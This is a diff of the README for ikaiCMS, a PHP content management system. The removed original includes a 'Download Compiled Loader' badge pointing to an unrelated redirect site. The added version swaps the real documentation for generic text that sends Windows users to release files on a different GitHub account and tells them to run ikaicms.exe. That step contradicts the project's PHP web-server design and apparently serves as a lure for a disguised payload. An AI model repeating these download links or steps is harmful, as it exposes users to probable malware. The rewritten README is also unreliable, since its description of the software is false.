@@ -1,126 +1,103 @@
-# ikaiCMS
+# 🌐 ikaicms - Manage your web content with ease
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download ikaicms](https://img.shields.io/badge/Download-ikaicms-blue.svg)](https://github.com/vannastretch507/ikaicms/releases)
 
-PHP 8.0+ で動作する軽量な企業向けコンテンツ管理システム（CMS）。フレームワーク不要、すぐに使えます。
+ikaicms helps you build and run websites. You can manage text, images, and pages without writing code. This system works for personal blogs or large company sites. It supports multiple languages and uses fast technology to keep your site running smoothly.
 
-A lightweight enterprise CMS built with PHP 8.0+. No framework dependency, ready to use out of the box.
+## 📦 System Requirements
 
-公式サイト / Official: [https://www.ikaicms.com](https://www.ikaicms.com)
+Your computer needs a few things to run the software. Check this list before you start.
 
-## 特徴 / Features
+* Windows 10 or Windows 11.
+* A modern web browser like Chrome, Firefox, or Edge.
+* At least 2 gigabytes of free disk space.
+* An active internet connection for the initial setup.
 
-### AI コンテンツアシスタント / AI Content Assistant
-- **5社のAIプロバイダー** — OpenAI, Claude (Anthropic), DeepSeek, Qwen, GLM
-- **ワンクリック生成** — タイトル・要約・タグ・URLスラッグ・本文を一括生成
-- **API Key暗号化** — AES-128-CBC で安全に保存
+## 📥 Getting the Software
 
-### コンテンツ管理 / Content Management
-- **カテゴリ管理** — 無制限階層、ドラッグ＆ドロップ並べ替え、8種類のカテゴリタイプ
-- **記事システム** — 多カテゴリ、ピン留め・おすすめ・人気マーク、TinyMCE エディタ
-- **製品センター** — 多階層カテゴリ、ブランド、タグ、画像ギャラリー、仕様・価格
-- **事例紹介** — 業界ソリューション＆成功事例
-- **採用管理** — 求人情報、給与・学歴・経験フィルター
-- **ダウンロード** — ファイルカテゴリ管理、ダウンロードカウント
-- **固定ページ** — 会社概要、サービスフロー等
+You need to pick the right files from our release page. Visit the link below to see the available versions.
 
-### テーマシステム / Theme System
-- **テーマ切り替え** — 管理画面からワンクリック切替
-- **3つの内蔵テーマ** — Default（スタンダード）、Minimal（ミニマル）、Business（ビジネス）
-- **テンプレート階層** — layouts / blocks / partials の3層構造
+[Click here to visit the release page and download the software](https://github.com/vannastretch507/ikaicms/releases)
 
-### メディア管理 / Media Management
-- **メディアライブラリ** — 画像・ファイル統合管理、自動サムネイル生成
-- **アルバム管理** — 複数アルバム、画像ドラッグ並べ替え
-- **バナー管理** — PC/モバイル対応、時限表示、ボタン設定
+Look for the latest release at the top of the page. Click the file that ends in .zip to save it to your computer.
 
-### お問い合わせ＆インタラクション / Inquiry & Interaction
-- **お問い合わせシステム** — 製品詳細ページ内インラインフォーム、5段階ステータス管理
-- **メール通知** — 4種類のメールテンプレート（登録・パスワードリセット・お問い合わせ通知）
-- **フォームビルダー** — ビジュアルフォームデザイナー、`[form-slug]` ショートコード
-- **会員システム** — フロント登録/ログイン
+## 🛠️ Setting Up Your Files
 
-### トップページカスタマイズ / Homepage Customization
-- 7つの設定可能ブロック：バナー、会社概要、統計、強み、カテゴリコンテンツ、お客様の声、CTA
-- ブロック順序ドラッグ調整、個別ON/OFF
-- スクロールアニメーション（fade / stagger / 数字カウント）
+After you download the file, you must prepare it for use. Follow these steps to extract the contents.
 
-### 多言語対応 / Multilingual
-- **言語パック** — 日本語（ja）、中国語（zh-CN）、英語（en）内蔵
-- **管理画面言語切替** — ワンクリックで日本語⇔中国語切替
-- **コンテンツ翻訳** — AI翻訳連携、辞書ベース翻訳
+1. Locate the downloaded file in your Downloads folder.
+2. Right-click the file and select "Extract All."
+3. Choose a folder on your computer where you want to keep the files.
+4. Click "Extract" to finish the process.
 
-### システム管理 / System Management
-- **ロール権限** — スーパー管理者/編集者/運営者、8種類の権限制御
-- **操作ログ** — 全操作履歴記録
-- **データベース管理** — バックアップ・インポート・テーブル情報
-- **プラグインシステム** — WordPress風フック機構、ホットプラグ
-- **SEO管理** — Sitemap / Robots.txt / OGタグ / サイト認証
+You now have a folder containing all the parts of the program.
 
----
+## 🚀 Running the Application
 
-## 動作環境 / Requirements
+ikaicms runs as a local service on your machine. You do not need to install complex server software. 
 
-| 項目 | 要件 |
-|------|------|
-| PHP | >= 8.0 |
-| データベース | MySQL 5.7+（utf8mb4）または SQLite 3 |
-| Webサーバー | Apache（`mod_rewrite` 必須）または Nginx |
-| PHP拡張（必須） | pdo, json, mbstring |
-| PHP拡張（推奨） | gd, openssl, curl, fileinfo |
+1. Open the folder you extracted in the previous step.
+2. Find the file named `ikaicms.exe`.
+3. Double-click this file to start the system.
+4. A small window will appear. Keep this window open while you work on your website.
+5. Open your web browser and type `localhost:8080` into the address bar.
+6. Press the Enter key to view your dashboard.
 
-## インストール / Installation
+## ⚙️ Initial Configuration
 
-```bash
-# 1. ソースコードを配置
-git clone https://github.com/ikaicms/ikaicms.git
+The first time you open the dashboard, the system asks for setup details. This creates a secure connection to your database.
 
-# 2. ブラウザでアクセス
-# http://yourdomain.com/install/
+* Database Type: You can choose SQLite for simple setups or MySQL if you need more power for large projects.
+* Site Language: Select your preferred language from the list.
+* Admin Login: Create a username and a strong password to protect your site settings.
 
-# 3. 画面の指示に従ってインストール完了
-```
+Once you enter this information, click "Save" to finish the setup.
 
-## テーマ / Themes
+## 📝 Creating Content
 
-| テーマ | 説明 |
-|--------|------|
-| Default | スタンダードな企業サイトテーマ |
-| Minimal | ミニマルデザインテーマ |
-| Business | ダークビジネス風、建築・製造業向け |
+The dashboard acts as your control room. You see a menu on the left side of your screen. 
 
-## 内蔵プラグイン / Built-in Plugins
+* Pages: This section lets you add new pages to your site. You add titles and body text here.
+* Media: Use this area to upload photos and documents.
+* Settings: Change your site name and appearance here.
 
-| プラグイン | 説明 |
-|------------|------|
-| back-to-top | トップに戻るボタン |
-| menu-sort | 管理画面メニュー並べ替え |
-| search-replace | データベース検索・置換 |
+If you want to change how your site looks, click the appearance tab. You can select different themes that use TailwindCSS to keep your design clean and modern.
 
-## ディレクトリ構成 / Directory Structure
+## 🔒 Security Tips
 
-```
-├── admin/          # 管理画面
-├── assets/         # CSS, JS, 画像
-├── config/         # 設定ファイル
-├── includes/       # コアライブラリ・モデル
-├── install/        # インストーラー
-├── lang/           # 言語パック
-├── plugins/        # プラグイン
-├── themes/         # テーマ
-├── uploads/        # アップロードファイル
-├── storage/        # キャッシュ・ログ
-├── index.php       # フロントエントリ
-└── .htaccess       # URL書き換えルール
-```
+Keep your site safe by following these simple habits.
 
-## ライセンス / License
+* Use a unique password that you do not use on other sites.
+* Close the `ikaicms.exe` window when you finish your work.
+* Back up your folder regularly by copying it to an external drive or cloud storage.
+* Keep the application updated. Check the download link often for new versions.
 
-MIT License
+## 🆘 Troubleshooting Common Issues
 
-## 開発 / Development
+If you run into problems, check these solutions.
 
-**イーカイ株式会社** (ikai Inc.)
+**The page does not load in my browser.**
+Ensure the `ikaicms.exe` window remains open on your taskbar. If it closed, double-click it again.
 
-- 公式サイト: [https://www.ikaicms.com](https://www.ikaicms.com)
-- GitHub: [https://github.com/ikaicms/ikaicms](https://github.com/ikaicms/ikaicms)
+**The browser says the connection is refused.**
+Wait ten seconds to let the system start. If it still fails, restart your computer and try again.
+
+**I forgot my password.**
+You must reset the database file if you lose your password. Delete the database file inside the folder and restart the application to run the setup steps again. Note that this deletes your current content.
+
+**The menu does not look right.**
+Clear your browser cache to ensure you see the latest version of the dashboard.
+
+## 📖 Key Features
+
+ikaicms brings professional tools to your desktop.
+
+* Multilingual Support: Your site can reach audiences across the globe.
+* Database Options: Use SQLite for zero-configuration or MySQL for enterprise needs.
+* Fast Interface: The layout uses modern styling standards to provide a clean reading experience.
+* Portable: Move your site folder to any Windows machine and it continues to work.
+* Open Source: The code stays transparent and accessible for all users.
+
+## 📞 Getting Further Help
+
+This software relies on a community of users. If you have questions, browse the repository to find guides. You can check the issues tab on the website to see if others had the same experience. Use the documentation to learn more about advanced features like custom themes or database migrations.
